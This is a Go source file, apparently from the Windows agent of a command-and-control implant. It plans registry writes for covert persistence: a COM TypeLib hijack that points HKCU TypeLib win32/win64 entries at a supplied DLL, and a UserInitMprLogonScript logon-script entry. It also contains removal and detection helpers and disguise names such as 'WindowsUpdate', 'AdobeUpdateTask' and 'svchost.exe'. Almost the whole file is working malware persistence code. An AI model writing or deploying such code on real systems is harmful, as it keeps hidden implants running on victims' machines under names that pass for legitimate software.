package main

// Registry-command plans for the two COM/logon persistence methods. The
// Windows agent executes these argv slices through reg.exe; keeping the plan
// here lets tests pin the exact registry writes on every GOOS, including the
// Linux CI runner (the executor itself is Windows-only).
//
// Each command stays a slice of separate arguments: joining a payload path
// into a shell string would let a path containing shell metacharacters change
// which registry value is written.

import (
	"fmt"
	"strings"
)

const (
	typeLibGUID     = "{4B6A2E5F-8C1D-4E37-9F2A-6D3B0C7E1A84}"
	typeLibBaseKey  = `HKCU\Software\Classes\TypeLib\` + typeLibGUID + `\1.0`
	logonScriptKey  = `HKCU\Environment`
	logonScriptName = "UserInitMprLogonScript"
)

// persistenceRegCommand is a reg.exe invocation: Args[0] is the operation
// ("add" or "delete") and the rest are reg.exe's own arguments.
type persistenceRegCommand struct {
	Args []string
}

func persistenceAddPlan(method, binaryPath string) ([]persistenceRegCommand, error) {
	switch method {
	case "typelib":
		if binaryPath == "" {
			return nil, fmt.Errorf("typelib: a DLL path is required")
		}
		win32 := typeLibBaseKey + `\0\win32`
		win64 := typeLibBaseKey + `\0\win64`
		return []persistenceRegCommand{
			{Args: []string{"add", win32, "/ve", "/t", "REG_SZ", "/d", binaryPath, "/f"}},
			{Args: []string{"add", win64, "/ve", "/t", "REG_SZ", "/d", binaryPath, "/f"}},
			{Args: []string{"add", typeLibBaseKey, "/v", "FLAGS", "/t", "REG_SZ", "/d", "2", "/f"}},
			{Args: []string{"add", typeLibBaseKey, "/v", "HELPDIR", "/t", "REG_SZ", "/d", windowsDir(binaryPath), "/f"}},
		}, nil
	case "logon_script":
		if binaryPath == "" {
			return nil, fmt.Errorf("logon_script: a command is required")
		}
		return []persistenceRegCommand{
			{Args: []string{"add", logonScriptKey, "/v", logonScriptName, "/t", "REG_SZ", "/d", binaryPath, "/f"}},
		}, nil
	default:
		return nil, fmt.Errorf("unknown persistence method: %s", method)
	}
}

func persistenceRemovePlan(method string) ([]persistenceRegCommand, error) {
	switch method {
	case "typelib":
		return []persistenceRegCommand{
			{Args: []string{"delete", `HKCU\Software\Classes\TypeLib\` + typeLibGUID, "/f"}},
		}, nil
	case "logon_script":
		return []persistenceRegCommand{
			{Args: []string{"delete", logonScriptKey, "/v", logonScriptName, "/f"}},
		}, nil
	default:
		return nil, fmt.Errorf("unknown persistence method: %s", method)
	}
}

// persistenceListQuery returns the registry key (and optional value name)
// that proves a method is still installed. The caller reads it with reg query.
func persistenceListQuery(method string) (key string, value string, ok bool) {
	switch method {
	case "typelib":
		return typeLibBaseKey + `\0\win32`, "", true
	case "logon_script":
		return logonScriptKey, logonScriptName, true
	default:
		return "", "", false
	}
}

// windowsDir keeps the target's separators: this helper also runs in tests on
// Linux, where filepath.Dir would treat `C:\path\file.dll` as a bare filename.
func windowsDir(path string) string {
	i := strings.LastIndexAny(path, `\/`)
	if i < 0 {
		return "."
	}
	dir := path[:i]
	if len(dir) == 2 && dir[1] == ':' {
		return dir + `\`
	}
	return dir
}

// persistenceNames returns every name an installer may have used for a
// method: the legacy auto-install name plus the explicit persistence_add
// name. Detection and removal must both cover the whole set, otherwise a
// task-installed entry reports "not found" and cleanup leaves it behind.
func persistenceNames(kind, prefix string) []string {
	var names []string
	switch kind {
	case "registry_run":
		names = []string{"WindowsUpdate", prefix}
	case "scheduled_task":
		names = []string{"AdobeUpdateTask", prefix + "Update"}
	case "startup_file":
		names = []string{"svchost.exe", prefix + ".exe"}
	default:
		return nil
	}
	seen := make(map[string]bool, len(names))
	out := make([]string, 0, len(names))
	for _, name := range names {
		if name == "" || seen[name] {
			continue
		}
		seen[name] = true
		out = append(out, name)
	}
	return out
}

// commandFound is the detection rule for reg.exe/schtasks/PowerShell probes:
// an error message on stdout is not evidence that an entry exists. The old
// len(out) > 0 check reported every missing registry value as "found".
func commandFound(out []byte, err error) bool {
	return err == nil && len(strings.TrimSpace(string(out))) > 0
}
